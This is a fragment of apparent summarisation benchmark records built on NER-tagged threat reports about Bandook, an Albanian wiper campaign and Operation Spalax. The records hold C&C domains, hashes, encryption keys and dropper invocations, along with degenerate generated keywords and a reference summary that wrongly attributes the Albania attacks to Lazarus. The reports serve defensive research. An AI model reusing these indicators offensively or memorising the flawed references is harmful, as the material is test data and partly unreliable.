process and inject a malicious payload into it . The payload contacts the [ORG] C&C sever , sends basic information about the infected machine , and waits for additional commands from the server . The variant of the Bandook malware we observed in this attack was not one of the variants whose builder was previously leaked to the Web ( which supported a range of [CARDINAL] more [CARDINAL] than [CARDINAL] 100 commands).In this attack , the threat actor utilized a custom , slimmed - down version of the malware with [CARDINAL] only [CARDINAL] 11 supported commands , including : File operations [PERSON] File executionFor a full list of commands and their corresponding request codes , see [PERSON] Appendix A.In this version , the communication protocol with the [ORG] C&C server was also upgraded to use AES encryption . Bandook variants in the wildAfter comparing the Bandook variant we observed in the attack with the ones created by different leaked builders , we began hunting for variants more similar to the ones we observed . Our search led us to tweets by the MalwareHunterTeam ( [ORG] MHT ) from [DATE] 2019 [DATE] - 2020 that mention various Bandook samples \u2014 all of them digitally signed with certificates that were issued by [ORG] Certum . In the newer attack flows we observed , we once again found valid [ORG] Certum certificates were used to sign the Bandook malware executable . Figure [CARDINAL] 10 : Signed Bandook samples discovered by [DATE] MHT.Figure [DATE] 11 : [PERSON] Valid signature information of a newly discoveredBandook sample . Analyzing all Bandook samples noted by [ORG] MHT , we discovered that the very [ORDINAL] first of the samples was compiled in [DATE] March [DATE] 2019 and supported around [CARDINAL] 120 commands . A sample compiled [DATE] a [DATE] few [DATE] days [DATE] later \u2013 a different signed Bandook variant ( with [CARDINAL] only [CARDINAL] 11 commands ) utilized the very same [ORG] C&C server . Since then , all signed samples use [CARDINAL] only [CARDINAL] 11 basic commands . The shared [ORG] C&C provides clear evidence that both the slimmed - down and the fully - fledged variants of the malware are operated by a single attacker . In addition to the Bandook samples that were reported by [ORG] MHT , we identified additional samples from the same time period ( [DATE] 2019 [DATE] - 2020 ) which were not digitally signed and contained about [CARDINAL] 120 commands . These were the only ITW Bandook samples we were able to locate from this time period . Several factors led us to believe that these signed and unsigned variants are specially crafted Bandook variants , used and developed by the same entity . Both use the same domain registration services for their [ORG] C&C domains : Porkbun or [ORG] NameSilo . They share a similar method of communication , using the [ORG] AES encryption algorithm in [ORG] CFB mode , with a hardcoded IV : 0123456789123456 . This feature is not available in the public leaks of this malware . They incorporated commands that we did not observe in any other public leak or report . Most notable are the commands to execute Python and Java payloads.url Signed & Delivered - Check Point ResearchAt this point , we have [CARDINAL] three different variants of the malware , which we believe are operated and sold by a single entity , in accordance with their chronological appearance : Figure [CARDINAL] 12 : Bandook subroutine to execute a precompiled Python from a file named \u201c dpx.pyc\u201d.1 . A full - fledged version with [CARDINAL] 120 commands ( not signed ) . [CARDINAL] 2 . A full - fledged version ( single sample ) with [CARDINAL] 120 commands ( signed ) . [CARDINAL] 3 . A slimmed - down version with [CARDINAL] 11 commands ( signed).The move to a slimmed - down version with [CARDINAL] only [CARDINAL] 11 commands for signed executables may indicate the operators \u2019 desire to reduce the malware \u2019s footprint and maximize their chances for an undetectable campaign against high profile targets ( and high paying customers ) , while continuing the use of the un - signed [CARDINAL] 120 commands variant for lower profile ones . Furthermore , such a minimized backdoor might indicate that the slimmed - down variant of [GPE] Bandook is only utilized as a loader for an additional , more full - featured malware to be downloaded next . [ORG] TargetingAs mentioned previously , in this campaign we observed an unusually large variety of targeted sectors and locations . This strengthens a hypothesis made by researchers \u2013 that the malware is not being developed and used by a single entity , but an offensive infrastructure is being sold by a [ORDINAL] third - party , to governments and threat actors worldwide , to facilitate offensive cyber operations . The different targeted sectors include : Government , financial , energy , food industry , healthcare , education , IT and legal institutions . In the following countries : [GPE] Singapore , Cyprus , [GPE] Chile , [GPE] Italy , [GPE] USA , [GPE] Turkey , [GPE] Switzerland , [GPE] Indonesia and [GPE] Germany . Connection to Dark CaracalThis campaign is n\u2019t the [ORDINAL] first instance of the [GPE] Bandook malware incorporated in a targeted attack . As mentioned , in a joint report from Lookout and the [ORG] EFF , targeted attacks utilizing a [GPE] Bandook variant , called \u201c Dark Caracal \u201d , were attributed to [ORG] the [ORG] Lebanese [ORG] General [ORG] Security [ORG] Directorate . Some of this campaign \u2019s characteristics and similarities to previous campaigns leads us to believe that the activity we describe in this report is indeed the continuation and evolution of the infrastructure used during the Dark Caracal operation : The use of the same certificate provider ( [ORG] Certum ) throughout the various campaigns . The use of [ORG] the [ORG] Bandook [ORG] Trojan , in what appears to be a unique evolving fork from the same source code ( which is not known to be publicly available ) . Samples from the Dark Caracal campaign ( [DATE] 2017 ) utilized around [CARDINAL] 100 commands , compared to the current [CARDINAL] 120 command version we analyzed . This wave of attacks shares the same anomalous characteristics for targeted attacks \u2013 an extreme variance in the selected targets , both in their industry and their geographic spread . Finally , [ORG] EFF researchers who [ORDINAL] first disclosed the [ORG] Dark [ORG] Caracal operation also believe that the same attacker \u201c is back at it \u201d again . [ORG] ConclusionAll evidence points to our belief that the mysterious operators behind the malicious infrastructure of \u201c Operation Manul \u201d and \u201c Dark Caracal \u201d are still alive and operational , willing to assist in the offensive cyber operations to anyone who is willing to pay . Although not as capable , nor as practiced in operational security like some other offensive security companies , the group behind the infrastructure in these attacks seems to improve over time , adding", "generated_text": "the document; Operation Manul; Dark Caracal; 2013; dozens; variants; Compromise; the malware; a third party; governments; threat actors; the campaign; 2015; 2016; stages; a Microsoft Word document; VBA; PowerShell scripts; the Bandook backdoor; the initial infection chain; the malware; detection; a design; APT; indicators; compromise; a variety; targeted sectors; locations; this past year; the main part; an offensive infrastructure; APT; security; detection; governments; threat actors.", "ref_text": "<START-1>The document is about a malware named Bandook that is used in a targeted attack. Bandook has a modular architecture and rich feature set including keylogging, screen captures, credential theft etc. It uses a loader written in Delphi and payload injected into Internet Explorer. It consists of three stages: Lure Documents, PowerShell Loader, and the Bandook Loader. The first stage starts with a Microsoft Word document containing malicious script data and an external template. The second stage decodes and executes a base64 encoded PowerShell stored in the second dropped file. The third stage is the final payload, which is a variant of an old full-featured RAT named Bandook. The malware uses the Process Hollowing technique to create a new instance of an Internet Explorer process and inject a malicious payload into it. The payload contacts the C&C server, sends basic information about the infected machine, and waits for additional commands from the server. The variants of the Bandook malware share similar methods of communication and incorporate commands that are not available in any other public leak or report. The authors believe that the same attacker who operated during the Dark Caracal operation is behind this malware infrastructure and is still active and willing to assist in cyber operations. <END-1>", "t5/keyword/hint_hit_precision": 0.0, "gpt3/lexical/rouge_rouge1": 0.4222222222222222, "gpt3/lexical/rouge_rouge2": 0.07821229050279331, "gpt3/lexical/rouge_rougeL": 0.18888888888888888, "gpt3/lexical/rouge_rougeLsum": 0.18888888888888888, "gpt3_generated_text": ["The article discusses the resurgence of the Bandook backdoor Trojan, a 13-year-old malware, in recent campaigns against various targets worldwide. The malware, which was featured in previous campaigns in 2015 and 2017, has reappeared with digitally signed variants in the threat landscape. The researchers believe that the malware is not developed in-house but is part of an offensive infrastructure sold by a third party to governments and threat actors. The article provides an overview of the infection chain used by the attackers, which involves a malicious Microsoft Word document, macros, and a PowerShell script to download and execute the Bandook backdoor. The researchers also highlight the various techniques used by the creators of the malware to hinder analysis and detection. The article concludes by emphasizing the need for proactive security measures and detection techniques to counter the evolving threat landscape posed by APTs and government-sponsored attacks."]}, {"split_name": "val", "sample_id": "val_128", "prompt_text": "Extract the keywords: securelist.com /ransomware - and - wiper - signed - with - stolen - certificates/108350/ Ransomware and wiper signed with stolen certificatesIntroductionOn [DATE] July 17 , [DATE] 2022 , [NORP] Albanian news outlets reported a massive cyberattack that affected [NORP] Albanian government e- services . [DATE] A [DATE] few [DATE] weeks [DATE] later , it was revealed that the cyberattacks were part of a coordinated effort likely intended to cripple the country \u2019s computer systems . On [DATE] September 10 , [DATE] 2022 , [NORP] Albanian local news reported a [ORDINAL] second wave of cyberattacks targeting [GPE] Albania \u2019s TIMS , [ORG] ADAM and [ORG] MEMEX systems \u2013 the latter [CARDINAL] two systems critical for law enforcement \u2013 reportedly using the same attack type and by the same actors . Around the same time , we identified ransomware and wiper malware samples resembling those used in the [ORDINAL] first wave , though with a few interesting modifications that likely allowed evasion of security controls and better attack speeds . Chief among those changes are the embedding of a raw disk driver , providing direct hard disk access inside the malware itself , modified metadata , and the use of [ORG] Nvidia \u2019s leaked code signing certificate to sign the malware . So , what \u2019s new in this blogpost?We compare the [ORDINAL] first and [ORDINAL] second waves of ransomware and wiper malware used to target [NORP] Albanian entities and detail connections with previously known [ORG] ROADSWEEP ransomware and [ORG] ZEROCLEARE variants . The threat actors used certificates from [ORG] Nvidia and [ORG] Kuwait [ORG] Telecommunications [ORG] Company to sign their malware ; the former was already leaked , but we \u2019re not sure how they got their hands on the latter . We identified potential cooperation between different attack groups speaking different languages , and the possible use of [ORG] AnyDesk as an initial entry point to start the ransomware / wiper infections . The changes implemented to automate and speed up wiping in the [ORDINAL] second wave of attacks are reminiscent of the notorious [LOC] Shamoon wiper attacks in [LOC] the [LOC] Middle [LOC] East . Wiper and ransomware , comparing wave [CARDINAL] 1 and wave [CARDINAL] 21/7Below , we compare and discuss the differences between the wave [CARDINAL] 1 and wave [CARDINAL] 2 ransomware and wiper malware . Initial Infection \u2013 traces of cooperation between different attack groups and use of [ORG] AnyDesk utilityAlthough we were n\u2019t able to identify the initial entry point of the threat actor in the analyzed intrusion , [DATE] a [DATE] few [DATE] days after the [ORDINAL] second wave wiping activities , we noticed underground chatter about someone having access to an [ORG] AnyDesk account at another non - governmental but significant [NORP] Albanian entity , and suggestions for Persian- speaking hackers to use it for deploying ransomware or wiper malware . This may increase the likelihood that the initial entry point for wave [CARDINAL] 2 is through legitimate remote access software such as [ORG] AnyDesk , especially since we know that the wave [CARDINAL] 2 wiper modifications included automatic execution upon driver installation only \u2013 potential need for urgency due to the limited time / access window . The attackers and access provider seemed to belong to different attack groups and spoke different languages . The ransomware \u2013 use of [ORG] Kuwait [ORG] Telecommunications [ORG] Company signing certificateMD5 We d Jul 06 21:30:41 [DATE] 2016 [CARDINAL] 32 - bit executable MinGW - w32 gcc [CARDINAL] 45.48 [ORG] KB [TIME] PdftoDoc.exeThis [TIME] second wave sample has the same signing certificate parameters as the [ORDINAL] first wave sample , which is related to [ORG] Kuwait [ORG] Telecommunications [ORG] Company . It \u2019s unclear how the threat actor was able to sign its malware using [ORG] Kuwait [ORG] Telecommunications [ORG] Company \u2019s certificate , but we suspect it was stolen . As of the date of this publication , the certificate is no longer valid and has been revoked . After the initial execution , the wave [CARDINAL] 2 ransomware checks for any [CARDINAL] six arguments ( or more ) supplied by the threat actor , as opposed to the wave [CARDINAL] 1 sample that checks for [CARDINAL] five arguments or more \u2013 a small modification that assists in defense evasion . Nevertheless , the intrusion analysis conducted on [CARDINAL] one of the affected machines indicates that in wave [CARDINAL] 2 the threat actor did not use a [ORG] BAT file to invoke the ransomware while supplying [CARDINAL] seven digits similar to wave [CARDINAL] 1 , but instead invoked the wave [CARDINAL] 2 ransomware immediately from the command line using [CARDINAL] six zeroes : \u201c [CARDINAL] 000000 \u201d . If ransomware execution fails because the correct arguments are not supplied , the wave [CARDINAL] 2 sample displays a different message from that of wave [CARDINAL] 1 ; the wave [CARDINAL] 2 message resembles an error message displayed by a [ORG] PDF to [ORG] DOC converter.2/7Wave [CARDINAL] 1 sample \u2013 messaging after failed execution Wave [CARDINAL] 2 sample \u2013 different messaging afterfailed executionThe wave [CARDINAL] 2 ransomware sample continues execution and checks for the mutex Screenlimitsdevices#77 ! ; , a value that differs from the wave [CARDINAL] 1 sample \u2019s mutex : abcdefghijklmnoklmnopqrstuvwxyz01234567890abcdefghijklmnopqrstuvwxyz01234567890Although we call this malware ransomware based on its behavior , the encrypted files are , in fact , unrecoverable . When comparing wave [CARDINAL] 2 ransomware samples to wave [CARDINAL] 1 , we notice that both have the same , and both use [ORG] CreateFile and [ORG] WriteFile APIs to overwrite files . During the process of execution , wave [CARDINAL] 2 ransomware attempts to decrypt and execute embedded scripts , malware settings or API function names . The encryption algorithm used is RC4 in both wave [CARDINAL] 1 and wave [CARDINAL] 2 . However , the RC4 key for decryption in wave [CARDINAL] 2 has been changed in another attempt to evade detection . Wave 1 RC4 key : 8C E4 [CARDINAL] B1 6B [CARDINAL] 22 [CARDINAL] B5 88 94 AA [CARDINAL] 86 C4 [CARDINAL] 21 [PRODUCT] E8 [PRODUCT] 75 [PRODUCT] 9D F3 Wave [CARDINAL] 2 RC4 key : [PRODUCT] F0 [PRODUCT] B4 [PRODUCT] ED [PRODUCT] D9 [CARDINAL] 43 F5 C8 [CARDINAL] 43 [PRODUCT] C9 [PRODUCT] D0 [PRODUCT] A2 4F 22 [CARDINAL] 9B [ORG] BC 3AIt \u2019s worth noting that in both waves , the RC4 decryption method uses [PERSON] CryptoAPI ( [ORG] CryptDecrypt ) instead of the usual substitution box method . The intrusion we analyzed in wave [CARDINAL] 2 indicates that the ransomware was probably deployed over the internal network , possibly from another compromised machine . This is reinforced by the fact that we did n\u2019t see anything else dropped or executed before the ransomware execution , and the ransomware executable name was randomly generated , potentially by the tool the threat actor used to deploy it over the network ( e.g. , Mellona.exe).Despite all the changes made in the wave [CARDINAL] 2 ransomware , the ransom notes remained the same and included 0x6319C758 ( [DATE] Thu [DATE] Sep [DATE] 08 03:43:36 [DATE] 2022 ) time File type PE 64 - bit [ORG] Compiler [ORG] Microsoft [ORG] Visual C / C++ File size [CARDINAL] 174.00 KB keyDiskSnapshot.exec:\\projects\\rawdisk\\bin\\wnet\\fre\\amd64\\rawdsk3.pdbB4B615C28CCD059CF8ED1ABF1C71FE03C0354522990AF63ADF3C911E2287A4B906D47DSimilar to the wave [CARDINAL] 2 ransomware sample , the threat actor made several modifications to the wave [CARDINAL] 2 wiper malware , probably to evade detection . The [CARDINAL] three main changes are:4/7Modified malware signing [WORK_OF_ART] Embedding [WORK_OF_ART] of [WORK_OF_ART] EldoS [WORK_OF_ART] RawDisk driver inside the wiper malware [GPE] Automatic wiping after driver installation commandHistorically , in [GPE] ZEROCLEARE and [ORG] DUSTMAN incidents from [DATE] 2019 , the wiper malware and raw disk drivers were not signed and therefore could not directly access the raw disk for speedy data wiping . So , the wipers had to use a [ORDINAL] third - party loader such as [ORG] TDL \u2013 a signed loader for unsigned drivers \u2013 to install the unsigned raw disk driver that allows the wiper malware to directly access the raw disk for wiping data using [ORG] DeviceControl API methods . However , in the [ORDINAL] first attack wave targeting [GPE] Albania , the threat actor signed the wave [CARDINAL] 1 wiper using [ORG] the [ORG] Kuwait [ORG] Telecommunications [ORG] Company certificate , thus removing the need for a [ORDINAL] third - party loader . The speed and automation improvements remind us of previous [PERSON] Shamoon operations in [LOC] the [LOC] Middle [LOC] East . Since the wave [CARDINAL] 1 wipers were exposed in [DATE] July [DATE] 2022 , and likely to avoid static detections , the threat actor used [ORG] Nvidia \u2019s leaked signing certificate to sign the wave [CARDINAL] 2 wiper in [DATE] September [DATE] 2022 , again eliminating the need for a [ORDINAL] third - party loader for the raw disk driver . In wave [CARDINAL] 1 , the wiper malware expected to find the raw disk driver in the execution directory or in the system directory . The driver was n\u2019t dropped by the wiper , and the threat actor likely dropped it using other means . Conversely , in wave [CARDINAL] 2 the threat actor embedded the signed raw disk driver in the wiper executable , dropped it and then installed it . In addition , the driver being used by the threat actor in wave [CARDINAL] 2 seems to copy metadata and a few functions from [ORG] Microsoft \u2019s diskdump.sys crash dump driver[1 ] ( version 10.0.19041.1682 ) as another means to avoid detections . The wiping activity starts automatically after the driver installation command ; as opposed to the wave [CARDINAL] 1 wiper , where installation is [CARDINAL] one step and wiping execution is a [ORDINAL] second step . Finally , for the most part , wave [CARDINAL] 1 and wave [CARDINAL] 2 wipers remained the same , including the reliance on the same authentication key to access the raw disk driver , and the use of the same [ORG] DeviceControl API methods , but with [CARDINAL] one exception , as shown below . It \u2019s worth noting that the method IOCTL_DISK_GET_LENGTH_INFO is exclusive to all [NORP] Persian - speaking [ORG] APT wipers . Wave [CARDINAL] 1 wiper [ORG] DeviceControl API methods : [PERSON] IOCTL_DISK_GET_DRIVE_GEOMETRY_EX [PERSON] Wave [CARDINAL] 2 wiper [ORG] DeviceControl API methods : IOCTL_VOLUME_GET_VOLUME_DISK_EXTENTS ( new method in wave [CARDINAL] 2 ; used in multiple IOCTL_DISK_GET_LENGTH_INFOBased on our telemetry , we suspect the infections are associated with law enforcement institutions in [GPE] Albania . This targeting is consistent with the previous wave of cyberattacks affecting the [NORP] Albanian government during the5/7July [DATE] 2022 wave of cyberattacks . ConclusionsIn this publication , we discussed the changes made to the [ORDINAL] second wave of ransomware and wiper samples that targeted [NORP] Albanian institutions to evade detection and inflict maximum damage . Aside from the changes made to evade detection in wave [CARDINAL] 2 , we suspect that the threat actors needed an automated and speedy wiper execution . In wave [CARDINAL] 2 , the raw disk driver was embedded inside the malware and the wiping routine started immediately after driver installation , as opposed to the wave [CARDINAL] 1 procedure . This is reminiscent of Shamoon operations in [LOC] the [LOC] Middle [LOC] East . Finally , for defenders we can highlight [CARDINAL] two important elements from the intrusion and malware analysis presented here : Monitor for remote software activities such as [ORG] AnyDesk for unauthorized use Always hunt and monitor for expired and/or leaked signing certificates as they can be used by threat actors to load and execute malwareThreat detectionThe detection logic has been improved in all our solutions to ensure that our customers remain protected . We continue to investigate this threat using our [ORG] Threat [ORG] Intelligence and we will add additional detection logic once they are available . Our products protect against this threat and detect it with the following names : HEUR : [ORG] Trojan - Ransom . Win32.Agent.gen Trojan-Ransom.Win32.Gen.aghh [PERSON] Trojan-Ransom.Win64.Agent.dpf [PERSON] Trojan . Win32.Agentb.kzkjIndicators of compromise [PRODUCT] cl.exe ( wave [CARDINAL] 1)DriverC7BE7E90F63DADA6CD541FA84880874B$windir\\$system32\\drivers\\disksdump.sys ( originally known as diskdump.sys)Signing certificates serial numbers6/714 78 1B [ORG] C8 [CARDINAL] 62 [GPE] E8 [GPE] DC 50 3A 55 93 [CARDINAL] 46 F5 DC C5 [DATE] 18 [DATE] 01 FD D0 93 F6 50 87 F4 E9 AE 11 ED 65 0D 83", "generated_text": "the document; Albanian; second; second wave; wiper malware; two years; the first wave; the second wave; the first wave; the use; Kuwait Telecommunications Company; ZEROCLEARE; the second wave; the initial entry point; the threat actor; use; a legitimate remote access software; AnyDesk; the malware; the initial entry point; command execution; deletion; the attackers; the malware; a byte; the data; the wiper; the sample; the attackers; Arabic; a variant; the wiper; the first wave; the second wave; use; the ZEROCLEARE ransomware; additional command execution; a payload; the payload; the payload; the payload; a second wave; the payload; the payload; the second wave; the payload; a payload; the payload; the payload; the payload; the payload; the payload; a script; the payload; the payload; the payload; the payload; the payload; analysis; ransomware and wiper malware; the second wave; connections; the Middle East; the first wave;", "ref_text": "<START-1>The cybercriminal group Lazarus has been conducting cyberattacks against Albanian government entities in two waves, using ransomware and data-wiping malware signed with stolen certificates. The first wave occurred in July 2022, impacting Albanian e-services. The second wave started in September, targeting critical law enforcement systems with similar malware but modified for detection evasion. Wave 2 ransomware samples share similarities with wave 1, including the use of CreateFile and WriteFile APIs for file overwrites and RC4 encryption algorithm. The ransomware in both waves is based on ROADSWEEP, uses stolen certificates to appear legitimate, and encrypts files in an unrecoverable way, rendering a ransom demand ineffective. The wiper malware embeds a raw disk driver for direct access to wipe data quickly. In the second wave, the attackers used a leaked Nvidia code signing certificate to sign the wiper and embedded the disk driver within the malware for automated execution post-installation. They also modified messaging and encryption keys to evade security controls. Underground posts suggest the attackers may have used AnyDesk for initial access. Different attack groups speaking Persian and another language appear to be cooperating in the campaign. The malware contains political messaging reflecting tensions between Albania and Iran. The targeting of law enforcement and modifications for speed align with prior devastating Shamoon wiper attacks in the Middle East. Defenders are advised to monitor for suspicious certificates and remote access software to detect potential intrusions. The publication provides indicators of compromise and detection details for the malware. <END-1>", "t5/keyword/hint_hit_precision": 0.0, "gpt3/lexical/rouge_rouge1": 0.5236907730673317, "gpt3/lexical/rouge_rouge2": 0.1904761904761905, "gpt3/lexical/rouge_rougeL": 0.2394014962593516, "gpt3/lexical/rouge_rougeLsum": 0.2394014962593516, "gpt3_generated_text": ["This article discusses the ransomware and wiper malware attacks that targeted Albanian government e-services. The cyberattacks, which occurred in two waves, aimed to cripple the country's computer systems. The second wave of attacks used modified malware samples that evaded security controls and had better attack speeds. The attackers used stolen certificates from Nvidia and the Kuwait Telecommunications Company to sign their malware. The initial entry point for the second wave may have been through the use of the AnyDesk remote access software. The article compares the differences between the first and second wave of ransomware and wiper malware and identifies potential cooperation between different attack groups. The second wave of attacks also showed similarities to the notorious Shamoon wiper attacks in the Middle East. The article concludes by discussing the use of the Kuwait Telecommunications Company's signing certificate and the changes in ransomware execution and messaging in the second wave."]}, {"split_name": "val", "sample_id": "val_129", "prompt_text": "Extract the keywords: Operation Spalax : Targeted malware attacks in [DATE] Colombiawelivesecurity.com/2021/01/12/operation-spalax-targeted-malware-attacks-colombiaJanuary 12 , [DATE] 2021In [DATE] 2020 ESET saw several attacks targeting [NORP] Colombian entities exclusively . These attacks are still ongoing at the time of writing and are focused on both government institutions and private companies . For the latter , the most targeted sectors are energy and metallurgical . The attackers rely on the use of remote access trojans , most likely to spy on their victims . They have a large network infrastructure for command and control : ESET observed [CARDINAL] at [CARDINAL] least [CARDINAL] 24 different [ORG] IP addresses in use in [DATE] the [DATE] second [DATE] half [DATE] of [DATE] 2020 . These are probably compromised devices that act as proxies for their [ORG] C&C servers . This , combined with the use of dynamic [ORG] DNS services , means that their infrastructure never stays still . We have seen [CARDINAL] at [CARDINAL] least [CARDINAL] 70 domain names active in this timeframe and they register new ones on a regular basis . The attackersThe attacks we saw in [DATE] 2020 share some TTPs with previous reports about groups targeting [GPE] Colombia , but also differ in many ways , thus making attribution difficult . [CARDINAL] One of those reports was published in [DATE] February [DATE] 2019 , by QiAnXin researchers . The operations described in that blogpost are connected to an [ORG] APT group active since [DATE] at [DATE] least [DATE] April [DATE] 2018 . We have found some similarities between those attacks and the ones that we describe in this article : We saw a malicious sample included in IoCs of QiAnXin \u2019s report and a sample from the new campaign in the same government organization . These files have [CARDINAL] fewer [CARDINAL] than [CARDINAL] a [CARDINAL] dozen sightings each . Some of the phishing emails from the current campaign were sent from [ORG] IP addresses corresponding to a range that belongs to [ORG] Powerhouse [ORG] Management , a [ORG] VPN service . The same [ORG] IP address range was used for emails sent in the earlier campaign . The phishing emails have similar topics and pretend to come from some of the same entities \u2013 for example , [ORG] the [ORG] Office [ORG] of [ORG] the [ORG] Attorney [ORG] General ( Fiscalia General de la Nacion ) or [ORG] the [ORG] National [ORG] Directorate [ORG] of [ORG] Taxes and [ORG] Customs ( DIAN ) . Some of the [ORG] C&C servers in [FAC] Operation [FAC] Spalax use linkpc.net and publicvm.com subdomains , along with [ORG] IP addresses that belong to [ORG] Powerhouse [ORG] Management . This also happened in the earlier campaign . However , there are differences in the attachments used for phishing emails , the remote access trojans ( RATs ) used and in most of the operator \u2019s [ORG] C&C infrastructure . There is also this report from [ORG] Trend [ORG] Micro , from [DATE] July [DATE] 2019 . There are similarities between the phishing emails and parts of the network infrastructure in that campaign and the one we describe here . The attacks described in that article were connected to cybercrime , not espionage . While we have not seen any payload delivered by the attackers other than RATs , some of the targets in the current campaign ( such as a lottery agency ) do n\u2019t make much sense for spying activities . These threat actors show perfect usage of the [LANGUAGE] Spanish language in the emails they send , they only target [NORP] Colombian entities , and they use premade malware and do n\u2019t develop any themselves . Attack overviewTargets are approached with emails that lead to the download of malicious files . In most cases , these emails have a [ORG] PDF document attached , which contains a link that the user must click to download the malware . The downloaded files are regular [ORG] RAR archives that have an executable file inside . These archives are hosted in legitimate file hosting services such as [ORG] OneDrive or [GPE] MediaFire . The target has to manually extract the file and execute it for the malware to run . We\u2019ve found a variety of packers used for these executables , but their purpose is always to have a remote access trojan running on the victimized computer , usually by decrypting the payload and injecting it into legitimate processes . An overview of a typical attack is shown in Figure [CARDINAL] 1 . We have seen the attackers use [CARDINAL] three different RATs : [GPE] Remcos , njRAT and AsyncRAT.1/15Phishing emailsFigure [CARDINAL] 1 . Overview of the attackThe attackers use various topics for their emails , but in most cases they are not specially crafted for their victims . On the contrary , most of these emails have generic topics that could be reused for different targets . We found phishing emails with these topics : A notification about a driving infraction A notification to take a mandatory [PERSON] COVID-19 test A notification to attend a court hearing An open investigation against the recipient for misuse of public funds A notification of an embargo of bank accountsThe email shown in Figure [CARDINAL] 2 pretends to be a notification about a driving infraction for a value of [MONEY] around US$ 250 . There is a [ORG] PDF file attached that promises a photo of the infraction , as well as information about time and place of the incident . The sender has been spoofed to make the email look like it is coming from SIMIT ( a system for paying transit violations in Colombia).2/15Figure [CARDINAL] 2 . Example of a phishing emailThe pdf file only contains an external link that has been shortened with the acortaurl service , as shown in Figure [CARDINAL] 3 . The shortened URL is : url the shortened link is expanded , a [ORG] RAR archive is downloaded from : url [CARDINAL] 3 . [ORG] PDF attached to phishing email3/15Figure [CARDINAL] 4 shows part of the email \u2019s header . The spoofed sender is notificacionesmultas@simit.org[.]co but we can see that the real sender is [ORG] IP address [DATE] 128.90.108[.]177 , which is connected with the domain name julian.linkpc[.]net , as found in historic [ORG] DNS data . It \u2019s not a coincidence that the same domain name is used for contacting the [ORG] C&C server in the malicious sample contained in the [ORG] RAR archive . This [ORG] IP address belongs to [ORG] Powerhouse [ORG] Management , a [ORG] VPN service provider . Figure [CARDINAL] 4 . Header of a phishing emailIn more recent emails , the shortened link in the [ORG] PDF file resolves to url ( a legitimate site ) when visited from outside of [GPE] Colombia . Also , in some cases the [ORG] GetResponse service has been used to send the email . This is probably done to track whether the victim has clicked on the link . In these cases there is no attachment : a link to the [ORG] GetResponse platform leads to the download of malware . You can see the other emails in the following gallery ( click to [CARDINAL] enlarge):Figures [CARDINAL] 5 [CARDINAL] to [CARDINAL] 13 . Various phishing emails and their attached files4/15Malicious artifactsDroppersThe executable files contained in compressed archives that are downloaded via the phishing emails are responsible for decrypting and running remote access trojans on a victimized computer . In the following sections , we describe the various droppers we have seen.5/15NSIS installersThe dropper that is most commonly used by these attackers comes as a file that was compiled with [ORG] NSIS ( [ORG] Nullsoft [ORG] Scriptable [ORG] Install [ORG] System ) . To try to evade detection , this installer contains several benign files that are written to disk ( they are not part of [ORG] NSIS binaries and they are not used at all by the installer ) and [CARDINAL] two files that are malicious : an encrypted [ORG] RAT executable and a [ORG] DLL file that decrypts and runs the trojan . An [ORG] NSIS script for [CARDINAL] one of these installers is shown in Figure [CARDINAL] 14 . The benign files are usually different in different droppers used by the attackers . Figure [CARDINAL] 14 . [ORG] NSIS script for [CARDINAL] one of the droppers ; the malicious files arehighlightedThe files [PERSON] Bonehead ( encrypted RAT ) and [ORG] ShoonCataclysm.dll ( dropper [ORG] DLL ) are written in the same folder and the [ORG] DLL is run with rundll32.exe using [ORG] Uboats as its argument . The names of these files change between executables . Some more examples are : [ORG] rundll32.exe Blackface , Breathing [ORG] rundll32.exe [ORG] OximeLied , [ORG] Hostage [ORG] rundll32.exe [ORG] Conservatory , [ORG] PigginsWe used the name of the benign files contained in some of these [ORG] NSIS installers to find more malicious installers used by the Spalax operators . Table 1 lists details of [CARDINAL] three different [ORG] NSIS installers used by the attackers that contained all the same benign files . The only difference among them was the encrypted file , which pointed to different [ORG] C&C servers . Table 1 . [ORG] NSIS installers with identical benign files used by this groupSHA-1C&C6/15SHA-1C&C6E81343018136B271D1F95DB536CA6B2FD1DFCD6 marzoorganigrama20202020.duckdns[.]org7EDB738018E0E91C257A6FC94BDBA50DAF899F90 ruthy.qdp6fj1uji[.]xyz812A407516F9712C80B70A14D6CDF282C88938C1dominoduck2098.duckdns[.]orgHowever , we also found malicious [ORG] NSIS installers used by other unrelated groups that had the same benign files as the ones used by this group . Figure [CARDINAL] 15 lists the files contained in [CARDINAL] two different [ORG] NSIS installers . The one on the left ( SHA-1 : [CARDINAL] 3AC39B5944019244E7E33999A2816304558FB1E8 ) is an executable used by this group and the one on the right ( SHA-1 : [CARDINAL] 6758741212F7AA2B77C42B2A2DE377D97154F860 ) is unrelated . The SHA-1 hashes for all the benign files are the same ( and also the filenames ) and even the malicious [ORG] DLL is the same . However , the encrypted file [ORG] Bonehead is different . Figure [CARDINAL] 15 . [PERSON] Files contained in [ORG] NSIS droppers from unrelated campaignsThis means that these installers were generated with the same builder , but by different actors . The builder is probably offered in underground forums and includes these benign files . This , along with a complete analysis of the dropper , was described [DATE] earlier [DATE] this [DATE] year by Sophos in their [ORG] RATicate article . There is also an article by Lab52 describing [CARDINAL] one of the [ORG] NSIS installers used in [GPE] Operation [GPE] Spalax , which they attribute to [ORG] APT - C-36.In the vast majority of cases these [ORG] NSIS droppers decrypt and run the Remcos RAT , but we have also seen cases where the payload is njRAT . These will be described later in the Payloads section . Agent Tesla packersWe have seen several droppers that are different variants of a packer that uses steganography and is known to be used in Agent Tesla samples . Interestingly , the attackers use various payloads , but none of them are Agent Tesla . Even though there are differences in all the samples regarding the layers of encryption , obfuscation or anti - analysis used , we can summarize the actions taken by the droppers as follows : The dropper reads a string ( or binary data ) from its resource section and decrypts it . The result is a [ORG] DLL that will be loaded and called in the same address space . The [ORG] DLL reads pixels from an image contained in the [ORDINAL] first binary and decrypts another executable . This one is loaded and executed in the same address space . This new executable is packed with CyaX. It reads data from its own resource section and decrypts a payload . There are anti- analysis checks ; if they pass , the payload can be injected into a new process or loaded in the same process space . The initial dropper is coded in C # . In all the samples that we have seen , the code for the dropper was hiding in non - malicious code , probably copied from other apps . The benign code is not executed ; it \u2019s there to evade detection.7/15In Figure [CARDINAL] 16 we see an example of the resources contained in one of these droppers . The text in green ( only shown partially ) is a string that will be decrypted to generate the next stage to be executed and the image that we see below the green text will be decrypted by the [ORDINAL] second stage malware . The algorithm used for decryption of the string varies from sample to sample , but sometimes the resource is just an unencrypted binary . Figure [CARDINAL] 16 . Resources contained in Agent Tesla \u2019s packerThe method to be executed in the [ORG] DLL is always named [ORG] StartGame or [ORG] StartUpdate . It reads the image from the [ORDINAL] first executable , and stores every pixel as [CARDINAL] three numbers according to its red , green and blue components . 